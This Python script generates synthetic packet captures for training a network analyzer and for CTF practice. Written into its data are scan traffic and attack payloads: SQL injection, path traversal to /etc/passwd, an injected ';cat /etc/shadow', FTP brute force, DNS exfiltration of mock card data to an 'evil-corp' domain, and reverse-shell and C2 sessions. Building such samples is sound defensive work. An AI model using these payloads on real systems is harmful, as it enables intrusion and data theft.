#!/usr/bin/env python3
"""Build demo capture files so the analyzer can be exercised without a live network.

    python3 tools/make_samples.py [output_dir]

Produces:
  recon_scan.pcap    an ARP sweep, ICMP sweep and a 400-port nmap-style SYN scan
  ctf_challenge.pcap cleartext creds, a flag in base64/XOR/DNS/ICMP, a carved PNG,
                     a reverse shell and a DNS exfiltration channel
"""

import os
import random
import struct
import sys
import time
import zlib

ETH_IP = 0x0800
ETH_ARP = 0x0806


def mac(s):
    return bytes(int(x, 16) for x in s.split(":"))


def ip(s):
    return bytes(int(x) for x in s.split("."))


def checksum(data):
    if len(data) % 2:
        data += b"\x00"
    total = sum(struct.unpack("!%dH" % (len(data) // 2), data))
    while total >> 16:
        total = (total & 0xFFFF) + (total >> 16)
    return (~total) & 0xFFFF


class Builder:
    def __init__(self, start=None):
        self.packets = []
        self.t = start or time.time() - 3600

    def tick(self, dt=0.001):
        self.t += dt
        return self.t

    def add(self, frame, dt=0.001):
        self.packets.append((self.tick(dt), frame))

    # -- layers ---------------------------------------------------------

    def eth(self, src, dst, etype, payload):
        return mac(dst) + mac(src) + struct.pack(">H", etype) + payload

    def ipv4(self, src, dst, proto, payload, ttl=64, ident=None):
        ident = ident if ident is not None else random.randint(0, 0xFFFF)
        total = 20 + len(payload)
        hdr = struct.pack(">BBHHHBBH4s4s", 0x45, 0, total, ident, 0x4000,
                          ttl, proto, 0, ip(src), ip(dst))
        csum = checksum(hdr)
        hdr = hdr[:10] + struct.pack(">H", csum) + hdr[12:]
        return hdr + payload

    def tcp(self, src, dst, sport, dport, seq, ack, flags, payload=b"", win=64240):
        hdr = struct.pack(">HHIIBBHHH", sport, dport, seq, ack, 5 << 4, flags, win, 0, 0)
        pseudo = ip(src) + ip(dst) + struct.pack(">BBH", 0, 6, len(hdr) + len(payload))
        csum = checksum(pseudo + hdr + payload)
        hdr = hdr[:16] + struct.pack(">H", csum) + hdr[18:]
        return hdr + payload

    def udp(self, src, dst, sport, dport, payload):
        length = 8 + len(payload)
        hdr = struct.pack(">HHHH", sport, dport, length, 0)
        pseudo = ip(src) + ip(dst) + struct.pack(">BBH", 0, 17, length)
        csum = checksum(pseudo + hdr + payload) or 0xFFFF
        hdr = struct.pack(">HHHH", sport, dport, length, csum)
        return hdr + payload

    def icmp(self, typ, code, ident, seq, payload):
        hdr = struct.pack(">BBHHH", typ, code, 0, ident, seq)
        csum = checksum(hdr + payload)
        return struct.pack(">BBHHH", typ, code, csum, ident, seq) + payload

    def arp(self, op, sha, spa, tha, tpa):
        return struct.pack(">HHBBH", 1, ETH_IP, 6, 4, op) + mac(sha) + ip(spa) + \
            mac(tha) + ip(tpa)

    # -- helpers --------------------------------------------------------

    def send_ip(self, smac, dmac, sip, dip, proto, payload, dt=0.001, ttl=64):
        self.add(self.eth(smac, dmac, ETH_IP, self.ipv4(sip, dip, proto, payload, ttl)), dt)

    def tcp_stream(self, a, b, sport, dport, exchanges, dt=0.02):
        """a/b are (mac, ip) tuples; exchanges is a list of (who, bytes)."""
        seq_a, seq_b = random.randint(0, 2**31), random.randint(0, 2**31)
        self.send_ip(a[0], b[0], a[1], b[1], 6,
                     self.tcp(a[1], b[1], sport, dport, seq_a, 0, 0x02), dt)
        self.send_ip(b[0], a[0], b[1], a[1], 6,
                     self.tcp(b[1], a[1], dport, sport, seq_b, seq_a + 1, 0x12), dt)
        seq_a += 1
        seq_b += 1
        self.send_ip(a[0], b[0], a[1], b[1], 6,
                     self.tcp(a[1], b[1], sport, dport, seq_a, seq_b, 0x10), dt)
        for who, data in exchanges:
            for off in range(0, len(data), 1400):
                chunk = data[off:off + 1400]
                if who == "a":
                    self.send_ip(a[0], b[0], a[1], b[1], 6,
                                 self.tcp(a[1], b[1], sport, dport, seq_a, seq_b, 0x18, chunk), dt)
                    seq_a += len(chunk)
                    self.send_ip(b[0], a[0], b[1], a[1], 6,
                                 self.tcp(b[1], a[1], dport, sport, seq_b, seq_a, 0x10), dt / 4)
                else:
                    self.send_ip(b[0], a[0], b[1], a[1], 6,
                                 self.tcp(b[1], a[1], dport, sport, seq_b, seq_a, 0x18, chunk), dt)
                    seq_b += len(chunk)
                    self.send_ip(a[0], b[0], a[1], b[1], 6,
                                 self.tcp(a[1], b[1], sport, dport, seq_a, seq_b, 0x10), dt / 4)
        self.send_ip(a[0], b[0], a[1], b[1], 6,
                     self.tcp(a[1], b[1], sport, dport, seq_a, seq_b, 0x11), dt)
        self.send_ip(b[0], a[0], b[1], a[1], 6,
                     self.tcp(b[1], a[1], dport, sport, seq_b, seq_a + 1, 0x11), dt)

    def write(self, path):
        with open(path, "wb") as fh:
            fh.write(struct.pack("<IHHiIII", 0xA1B2C3D4, 2, 4, 0, 0, 262144, 1))
            for ts, frame in self.packets:
                sec = int(ts)
                usec = int((ts - sec) * 1_000_000)
                fh.write(struct.pack("<IIII", sec, usec, len(frame), len(frame)))
                fh.write(frame)
        return path


def dns_query(name, qtype=1, tid=None, response=None):
    tid = tid if tid is not None else random.randint(0, 0xFFFF)
    q = b"".join(bytes([len(l)]) + l.encode() for l in name.split(".")) + b"\x00"
    flags = 0x8180 if response else 0x0100
    an = 1 if response else 0
    msg = struct.pack(">HHHHHH", tid, flags, 1, an, 0, 0) + q + struct.pack(">HH", qtype, 1)
    if response:
        msg += b"\xc0\x0c" + struct.pack(">HHIH", qtype, 1, 60, len(response)) + response
    return msg


def png_bytes(width=64, height=64, text=b"flag{pixel_perfect_exfil}"):
    def chunk(tag, data):
        raw = tag + data
        return struct.pack(">I", len(data)) + raw + struct.pack(">I", zlib.crc32(raw))
    ihdr = struct.pack(">IIBBBBB", width, height, 8, 2, 0, 0, 0)
    raw = b""
    for y in range(height):
        raw += b"\x00" + bytes(v for x in range(width)
                               for v in ((x * 4) % 256, (y * 4) % 256, 160))
    idat = zlib.compress(raw, 6)
    return (b"\x89PNG\r\n\x1a\n" + chunk(b"IHDR", ihdr) + chunk(b"tEXt", b"Comment\x00" + text)
            + chunk(b"IDAT", idat) + chunk(b"IEND", b""))


# ---------------------------------------------------------------------------
# sample 1: reconnaissance
# ---------------------------------------------------------------------------

def build_recon(path):
    b = Builder()
    attacker_mac, attacker_ip = "de:ad:be:ef:00:01", "192.168.56.101"
    victim_mac, victim_ip = "08:00:27:aa:bb:cc", "192.168.56.10"
    gw_mac, gw_ip = "08:00:27:11:22:33", "192.168.56.1"
    bcast = "ff:ff:ff:ff:ff:ff"

    # normal background chatter first
    b.tcp_stream((attacker_mac, attacker_ip), (gw_mac, gw_ip), 51000, 80, [
        ("a", b"GET / HTTP/1.1\r\nHost: gateway.local\r\nUser-Agent: Mozilla/5.0\r\n\r\n"),
        ("b", b"HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nContent-Length: 44\r\n\r\n"
              b"<html><body><h1>Gateway</h1></body></html>"),
    ], dt=0.05)

    # ARP sweep of the /24
    for host in range(1, 40):
        b.add(b.eth(attacker_mac, bcast, ETH_ARP,
                    b.arp(1, attacker_mac, attacker_ip, "00:00:00:00:00:00",
                          "192.168.56.%d" % host)), 0.004)
        if host in (1, 10, 20):
            b.add(b.eth(victim_mac if host == 10 else gw_mac, attacker_mac, ETH_ARP,
                        b.arp(2, victim_mac if host == 10 else gw_mac,
                              "192.168.56.%d" % host, attacker_mac, attacker_ip)), 0.001)

    # ICMP ping sweep
    for host in range(1, 25):
        b.send_ip(attacker_mac, gw_mac, attacker_ip, "192.168.56.%d" % host, 1,
                  b.icmp(8, 0, 0x1234, host, bytes(range(48))), 0.003)
        if host in (1, 10):
            b.send_ip(gw_mac, attacker_mac, "192.168.56.%d" % host, attacker_ip, 1,
                      b.icmp(0, 0, 0x1234, host, bytes(range(48))), 0.001)

    # TCP SYN scan of 400 ports, three of them open
    open_ports = {22, 80, 3306}
    ports = sorted(random.sample(range(1, 1024), 380) + list(open_ports))
    for i, port in enumerate(ports):
        sport = 40000 + (i % 2000)
        b.send_ip(attacker_mac, victim_mac, attacker_ip, victim_ip, 6,
                  b.tcp(attacker_ip, victim_ip, sport, port, 0x1000 + i, 0, 0x02, win=1024),
                  0.0012)
        if port in open_ports:
            b.send_ip(victim_mac, attacker_mac, victim_ip, attacker_ip, 6,
                      b.tcp(victim_ip, attacker_ip, port, sport, 0x9000 + i, 0x1001 + i, 0x12),
                      0.0004)
            b.send_ip(attacker_mac, victim_mac, attacker_ip, victim_ip, 6,
                      b.tcp(attacker_ip, victim_ip, sport, port, 0x1001 + i, 0x9001 + i, 0x04),
                      0.0004)
        else:
            b.send_ip(victim_mac, attacker_mac, victim_ip, attacker_ip, 6,
                      b.tcp(victim_ip, attacker_ip, port, sport, 0, 0x1001 + i, 0x14),
                      0.0004)

    # a handful of NULL-scan probes
    for port in (21, 22, 23, 25, 80, 139, 443, 445):
        b.send_ip(attacker_mac, victim_mac, attacker_ip, victim_ip, 6,
                  b.tcp(attacker_ip, victim_ip, 45000, port, 0x2000, 0, 0x00), 0.002)

    # UDP scan
    for port in random.sample(range(1, 500), 40):
        b.send_ip(attacker_mac, victim_mac, attacker_ip, victim_ip, 17,
                  b.udp(attacker_ip, victim_ip, 44444, port, b""), 0.002)
        b.send_ip(victim_mac, attacker_mac, victim_ip, attacker_ip, 1,
                  b.icmp(3, 3, 0, 0, b"\x00" * 28), 0.001)

    # follow-up: service grab on an open port
    b.tcp_stream((attacker_mac, attacker_ip), (victim_mac, victim_ip), 52000, 22, [
        ("b", b"SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.4\r\n"),
        ("a", b"SSH-2.0-Nmap-SSH2-Hostkey\r\n"),
    ], dt=0.03)
    return b.write(path)


# ---------------------------------------------------------------------------
# sample 2: CTF-style capture
# ---------------------------------------------------------------------------

def build_ctf(path):
    b = Builder()
    cli = ("52:54:00:12:34:56", "10.10.14.7")
    srv = ("52:54:00:ab:cd:ef", "10.10.10.20")
    dns = ("52:54:00:ab:cd:ef", "10.10.10.53")
    evil = ("52:54:00:99:99:99", "185.199.108.153")

    # 1. FTP login in the clear + a file transfer containing a PNG
    b.tcp_stream(cli, srv, 49712, 21, [
        ("b", b"220 (vsFTPd 3.0.3)\r\n"),
        ("a", b"USER anonymous\r\n"),
        ("b", b"331 Please specify the password.\r\n"),
        ("a", b"PASS s3cr3t_ftp_p@ss\r\n"),
        ("b", b"230 Login successful.\r\n"),
        ("a", b"RETR secret_map.png\r\n"),
        ("b", b"150 Opening BINARY mode data connection for secret_map.png\r\n"),
        ("b", b"226 Transfer complete.\r\n"),
    ], dt=0.04)
    b.tcp_stream(cli, srv, 49713, 20, [("b", png_bytes())], dt=0.01)

    # 2. HTTP with Basic auth and a flag in a base64 cookie
    import base64
    token = base64.b64encode(b"flag{h77p_c00k13s_4r3_n0t_s3cr3t}").decode()
    b.tcp_stream(cli, srv, 49714, 80, [
        ("a", b"GET /admin/notes.txt HTTP/1.1\r\nHost: target.htb\r\n"
              b"User-Agent: Mozilla/5.0 (X11; Linux x86_64)\r\n"
              b"Authorization: Basic YWRtaW46aHVudGVyMg==\r\n"
              + ("Cookie: session=%s\r\n" % token).encode() + b"\r\n"),
        ("b", b"HTTP/1.1 200 OK\r\nServer: nginx/1.18.0\r\nContent-Type: text/plain\r\n"
              b"Content-Length: 122\r\n\r\n"
              b"internal notes:\n - rotate the ftp password\n"
              b" - the staging flag is CTF{r34ss3mbly_w0rks}\n - remove /admin before launch\n"),
    ], dt=0.03)

    # 3. Telnet session with typed credentials and a shell command
    b.tcp_stream(cli, srv, 49715, 23, [
        ("b", b"\xff\xfd\x18\xff\xfd \xff\xfd#\xff\xfd'"),
        ("b", b"Ubuntu 20.04.6 LTS\r\nlogin: "),
        ("a", b"operator\r\n"),
        ("b", b"Password: "),
        ("a", b"Tr0ub4dor&3\r\n"),
        ("b", b"Welcome to the appliance shell\r\noperator@appliance:~$ "),
        ("a", b"id\r\n"),
        ("b", b"uid=1000(operator) gid=1000(operator) groups=1000(operator)\r\n"
              b"operator@appliance:~$ "),
        ("a", b"cat /opt/flag.txt\r\n"),
        ("b", b"flag{t3ln3t_1s_n3v3r_s4f3}\r\noperator@appliance:~$ "),
    ], dt=0.05)

    # 4. SMTP with base64 AUTH LOGIN
    b.tcp_stream(cli, srv, 49716, 25, [
        ("b", b"220 mail.target.htb ESMTP Postfix\r\n"),
        ("a", b"EHLO client\r\n"),
        ("b", b"250-mail.target.htb\r\n250 AUTH LOGIN PLAIN\r\n"),
        ("a", b"AUTH LOGIN\r\n"),
        ("b", b"334 VXNlcm5hbWU6\r\n"),
        ("a", base64.b64encode(b"svc-backup@target.htb") + b"\r\n"),
        ("b", b"334 UGFzc3dvcmQ6\r\n"),
        ("a", base64.b64encode(b"W1nt3r2024!") + b"\r\n"),
        ("b", b"235 2.7.0 Authentication successful\r\n"),
    ], dt=0.04)

    # 5. DNS exfiltration: base64 chunks under one zone
    secret = base64.b64encode(
        b"flag{dns_3xf1l7r4710n_d3t3c73d}\n"
        b"customer_id,name,card\n"
        b"1001,A. Turing,4111111111111111\n"
        b"1002,G. Hopper,4222222222222222\n"
        b"1003,K. Johnson,4333333333333333\n"
        b"1004,R. Hamilton,4444444444444444\n"
        b"1005,B. Liskov,4555555555555555\n"
    ).decode().replace("=", "")
    chunks = [secret[i:i + 28] for i in range(0, len(secret), 28)]
    for i, ch in enumerate(chunks):
        name = "%s.%02d.tunnel.evil-corp.net" % (ch, i)
        b.send_ip(cli[0], dns[0], cli[1], dns[1], 17,
                  b.udp(cli[1], dns[1], 53000 + i, 53, dns_query(name, 16)), 0.03)
        b.send_ip(dns[0], cli[0], dns[1], cli[1], 17,
                  b.udp(dns[1], cli[1], 53, 53000 + i,
                        dns_query(name, 16, response=b"\x03ack")), 0.005)

    # ordinary DNS so the tunnel stands out against normal traffic
    for host in ("www.example.com", "cdn.example.com", "api.github.com", "ubuntu.com"):
        b.send_ip(cli[0], dns[0], cli[1], dns[1], 17,
                  b.udp(cli[1], dns[1], 55000, 53, dns_query(host)), 0.1)
        b.send_ip(dns[0], cli[0], dns[1], cli[1], 17,
                  b.udp(dns[1], cli[1], 53, 55000, dns_query(host, response=ip("93.184.216.34"))),
                  0.01)

    # 6. ICMP tunnel carrying a flag
    payload = b"flag{p1ng_p4yl04ds_c4rry_d4t4} exfil chunk %02d ................"
    for i in range(12):
        b.send_ip(cli[0], evil[0], cli[1], evil[1], 1,
                  b.icmp(8, 0, 0x4242, i, payload % i), 0.08)
        b.send_ip(evil[0], cli[0], evil[1], cli[1], 1,
                  b.icmp(0, 0, 0x4242, i, b"ok %02d" % i + b"." * 40), 0.02)

    # 7. XOR-obfuscated flag over a raw TCP channel
    xored = bytes(c ^ 0x5A for c in b"flag{x0r_1s_n0t_encryp710n}")
    b.tcp_stream(cli, evil, 49717, 9001, [
        ("a", b"BEGIN\n" + xored + b"\nEND\n"),
        ("b", b"ack\n"),
    ], dt=0.05)

    # 8. reverse shell on 4444 with beaconing check-ins
    b.tcp_stream(evil, cli, 4444, 44445, [
        ("b", b"Microsoft Windows [Version 10.0.19045.3803]\r\n(c) Microsoft Corporation.\r\n\r\n"
              b"C:\\Users\\victim>"),
        ("a", b"whoami\r\n"),
        ("b", b"victim-pc\\victim\r\n\r\nC:\\Users\\victim>"),
        ("a", b"type C:\\Users\\victim\\Desktop\\proof.txt\r\n"),
        ("b", b"HTB{r3v3rs3_sh3ll_c4ught}\r\n\r\nC:\\Users\\victim>"),
    ], dt=0.06)

    # 9. C2 beaconing every 5 seconds
    for i in range(10):
        b.send_ip(cli[0], evil[0], cli[1], evil[1], 6,
                  b.tcp(cli[1], evil[1], 50000 + i, 8080, 0x3000 + i, 0, 0x02), 5.0)
        b.send_ip(evil[0], cli[0], evil[1], cli[1], 6,
                  b.tcp(evil[1], cli[1], 8080, 50000 + i, 0x7000, 0x3001 + i, 0x12), 0.01)

    # 10. web attack traffic: sqlmap, LFI, command injection
    b.tcp_stream(cli, srv, 49718, 80, [
        ("a", b"GET /product.php?id=1%27%20UNION%20SELECT%20username,password%20FROM%20users--"
              b" HTTP/1.1\r\nHost: target.htb\r\nUser-Agent: sqlmap/1.7.2#stable\r\n\r\n"),
        ("b", b"HTTP/1.1 500 Internal Server Error\r\nContent-Length: 31\r\n\r\n"
              b"SQL syntax error near UNION.\r\n"),
        ("a", b"GET /view.php?file=../../../../etc/passwd HTTP/1.1\r\nHost: target.htb\r\n"
              b"User-Agent: curl/8.1.2\r\n\r\n"),
        ("b", b"HTTP/1.1 200 OK\r\nContent-Length: 68\r\n\r\n"
              b"root:x:0:0:root:/root:/bin/bash\nwww-data:x:33:33:/var/www:/bin/sh\n"),
        ("a", b"GET /ping.php?host=127.0.0.1;cat%20/etc/shadow HTTP/1.1\r\nHost: target.htb\r\n\r\n"),
        ("b", b"HTTP/1.1 200 OK\r\nContent-Length: 12\r\n\r\nPING ok\r\n"),
    ], dt=0.04)

    # 11. FTP brute force
    for i, pw in enumerate(["123456", "password", "admin", "letmein", "qwerty",
                            "dragon", "monkey", "root123"]):
        b.tcp_stream(cli, srv, 50100 + i, 21, [
            ("b", b"220 (vsFTPd 3.0.3)\r\n"),
            ("a", b"USER admin\r\n"),
            ("b", b"331 Please specify the password.\r\n"),
            ("a", ("PASS %s\r\n" % pw).encode()),
            ("b", b"530 Login incorrect.\r\n"),
        ], dt=0.02)

    # 12. private key leaked over HTTP
    key = (b"-----BEGIN RSA PRIVATE KEY-----\n"
           + base64.b64encode(os.urandom(600)) + b"\n-----END RSA PRIVATE KEY-----\n")
    b.tcp_stream(cli, srv, 49719, 80, [
        ("a", b"GET /backup/id_rsa HTTP/1.1\r\nHost: target.htb\r\n\r\n"),
        ("b", b"HTTP/1.1 200 OK\r\nContent-Type: application/octet-stream\r\n"
              b"Content-Disposition: attachment; filename=\"id_rsa\"\r\n"
              + ("Content-Length: %d\r\n\r\n" % len(key)).encode() + key),
    ], dt=0.03)

    b.packets.sort(key=lambda p: p[0])
    return b.write(path)


def main():
    out = sys.argv[1] if len(sys.argv) > 1 else os.path.join(
        os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "samples")
    os.makedirs(out, exist_ok=True)
    random.seed(1337)
    a = build_recon(os.path.join(out, "recon_scan.pcap"))
    random.seed(7)
    c = build_ctf(os.path.join(out, "ctf_challenge.pcap"))
    for p in (a, c):
        print("%-52s %8.1f KB" % (p, os.path.getsize(p) / 1024))


if __name__ == "__main__":
    main()
